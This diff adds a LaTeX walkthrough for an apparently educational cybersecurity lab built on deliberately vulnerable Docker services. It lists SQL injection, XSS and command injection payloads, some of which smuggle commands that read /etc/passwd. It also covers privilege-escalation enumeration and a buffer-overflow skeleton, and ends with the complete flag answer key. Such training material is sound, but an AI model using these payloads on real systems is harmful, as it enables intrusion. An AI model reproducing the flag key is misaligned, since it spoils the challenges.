@@ -1,0 +1,205 @@
+\documentclass[12pt,a4paper]{report}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{geometry}
+\usepackage{graphicx}
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage{hyperref}
+\usepackage{fancyhdr}
+\usepackage{titlesec}
+\usepackage{enumitem}
+\usepackage{booktabs}
+\usepackage{longtable}
+\usepackage{parskip}
+
+\geometry{margin=1in}
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+\definecolor{darkblue}{rgb}{0,0,0.5}
+
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{darkblue}\bfseries,
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\small,
+    breaklines=true,
+    numbers=left,
+    frame=single
+}
+\lstset{style=mystyle}
+
+\hypersetup{colorlinks=true,linkcolor=darkblue,urlcolor=blue}
+
+\pagestyle{fancy}
+\fancyhf{}
+\fancyhead[L]{\leftmark}
+\fancyhead[R]{CyberLab}
+\fancyfoot[C]{\thepage}
+
+\title{\textbf{\Huge CyberLab Walkthrough}\\[0.5cm]\Large Comprehensive Cybersecurity Learning Platform}
+\author{CyberLab Educational Platform}
+\date{\today}
+
+\begin{document}
+\maketitle
+\tableofcontents
+\newpage
+
+\chapter{Introduction to CyberLab}
+\section{Platform Overview}
+CyberLab is a comprehensive cybersecurity learning platform with 50+ labs covering web security, network analysis, and system exploitation using Docker-based vulnerable systems.
+
+\begin{table}[h]
+\centering
+\begin{tabular}{@{}llll@{}}
+\toprule
+\textbf{Service} & \textbf{Port} & \textbf{Purpose} & \textbf{Difficulty} \\
+\midrule
+DVWA & 8081 & Web vulnerabilities & Beginner \\
+Juice Shop & 8082 & OWASP challenges & Intermediate \\
+WebGoat & 8083 & Guided lessons & Beginner \\
+MySQL & 3307 & SQL injection & Intermediate \\
+Buffer Overflow & 9999 & Binary exploitation & Advanced \\
+\bottomrule
+\end{tabular}
+\caption{CyberLab Services}
+\end{table}
+
+\chapter{SQL Injection}
+\section{Understanding SQL Injection}
+SQL Injection occurs when user input is incorporated into SQL queries without proper sanitization.
+
+\begin{lstlisting}[language=SQL]
+-- Authentication bypass
+' OR '1'='1
+admin'--
+
+-- UNION injection
+' UNION SELECT username,password FROM users--
+\end{lstlisting}
+
+\section{Lab Walkthrough}
+\begin{enumerate}
+\item Navigate to http://localhost:8081
+\item Login with admin:password
+\item Set security to Low
+\item Test: 1' UNION SELECT user,password FROM users--
+\end{enumerate}
+
+\textbf{FLAG:} FLAG\{sql\_1nj3ct10n\_m4st3r\}
+
+\chapter{Cross-Site Scripting (XSS)}
+\section{Types of XSS}
+\begin{itemize}
+\item \textbf{Reflected}: Script reflected off server
+\item \textbf{Stored}: Script permanently stored
+\item \textbf{DOM-Based}: Client-side vulnerability
+\end{itemize}
+
+\begin{lstlisting}[language=HTML]
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+\end{lstlisting}
+
+\textbf{FLAG:} FLAG\{xss\_c00k13\_th13f\}
+
+\chapter{Command Injection}
+\section{Injection Operators}
+\begin{lstlisting}
+127.0.0.1; whoami
+127.0.0.1 | cat /etc/passwd
+127.0.0.1 && id
+\end{lstlisting}
+
+\textbf{FLAG:} FLAG\{c0mm4nd\_1nj3ct10n\_pwn3d\}
+
+\chapter{Network Analysis}
+\section{tcpdump and Wireshark}
+\begin{lstlisting}[language=bash]
+tcpdump -i eth0 -w capture.pcap
+tcpdump -i eth0 host 192.168.1.1 port 80
+\end{lstlisting}
+
+\section{Nmap Scanning}
+\begin{lstlisting}[language=bash]
+nmap -sC -sV target
+nmap -p- target
+nmap --script vuln target
+\end{lstlisting}
+
+\textbf{FLAG:} FLAG\{n3tw0rk\_f0r3ns1cs\_pr0\}
+
+\chapter{Buffer Overflow}
+\section{Understanding Memory}
+Buffer overflows occur when data exceeds allocated memory, potentially overwriting the return address.
+
+\begin{lstlisting}[language=Python]
+from pwn import *
+offset = 72
+payload = b'A' * offset + p64(0x41414141)
+\end{lstlisting}
+
+\textbf{FLAG:} FLAG\{buff3r\_0v3rfl0w\_m4st3r\}
+
+\chapter{Privilege Escalation}
+\section{Linux PrivEsc}
+\begin{lstlisting}[language=bash]
+sudo -l
+find / -perm -4000 2>/dev/null
+cat /etc/crontab
+\end{lstlisting}
+
+\textbf{FLAG:} FLAG\{pr1v3sc\_t0\_r00t\}
+
+\chapter{Tools Reference}
+\begin{lstlisting}[language=bash]
+# sqlmap
+sqlmap -u "URL?id=1" --dbs
+
+# John the Ripper
+john --wordlist=rockyou.txt hashes.txt
+
+# Metasploit
+msfconsole
+use exploit/multi/handler
+\end{lstlisting}
+
+\appendix
+\chapter{Flag List}
+\begin{longtable}{@{}p{4cm}p{7cm}p{2cm}@{}}
+\toprule
+\textbf{Challenge} & \textbf{Flag} & \textbf{Points} \\
+\midrule
+SQL Injection & FLAG\{sql\_1nj3ct10n\_m4st3r\} & 100 \\
+XSS & FLAG\{xss\_c00k13\_th13f\} & 150 \\
+Command Injection & FLAG\{c0mm4nd\_1nj3ct10n\_pwn3d\} & 150 \\
+Buffer Overflow & FLAG\{buff3r\_0v3rfl0w\_m4st3r\} & 300 \\
+Network Forensics & FLAG\{n3tw0rk\_f0r3ns1cs\_pr0\} & 200 \\
+Privilege Escalation & FLAG\{pr1v3sc\_t0\_r00t\} & 250 \\
+MySQL & FLAG\{mysql\_pwn3d\} & 150 \\
+PostgreSQL & FLAG\{p0stgr3s\_pwn3d\} & 150 \\
+\bottomrule
+\end{longtable}
+
+\chapter{Quick Reference}
+\begin{lstlisting}[language=bash]
+# Docker
+docker-compose up -d
+docker-compose down
+docker ps
+
+# Services
+DVWA: http://localhost:8081 (admin:password)
+Juice Shop: http://localhost:8082
+WebGoat: http://localhost:8083/WebGoat
+MySQL: mysql -h 127.0.0.1 -P 3307 -u admin -padmin123
+Redis: redis-cli -p 6380
+BOF Server: nc localhost 9999
+\end{lstlisting}
+
+\end{document}
